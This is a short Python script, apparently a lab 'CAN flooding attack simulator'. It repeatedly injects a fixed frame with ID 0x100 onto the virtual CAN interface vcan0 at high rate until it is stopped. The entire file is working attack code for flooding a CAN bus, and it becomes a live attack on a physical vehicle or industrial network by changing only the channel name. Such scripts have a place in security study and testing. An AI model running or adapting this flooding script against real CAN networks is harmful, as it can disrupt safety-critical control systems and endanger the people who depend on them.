import can
import time


CAN_ID = 0x100

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)


print("=" * 60)
print(" CAN FLOODING ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x100")
print("Interface     : vcan0")
print("Attack rate   : High")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()


message = can.Message(
    arbitration_id=CAN_ID,
    data=[0x03, 0xE8, 0x00],
    is_extended_id=False
)


count = 0

try:

    while True:

        bus.send(message)

        count += 1

        if count % 100 == 0:
            print(
                f"Flooding... "
                f"{count} frames sent"
            )

        time.sleep(0.001)

except KeyboardInterrupt:

    print()
    print(
        f"Flooding stopped. "
        f"Total frames: {count}"
    )

finally:

    bus.shutdown()
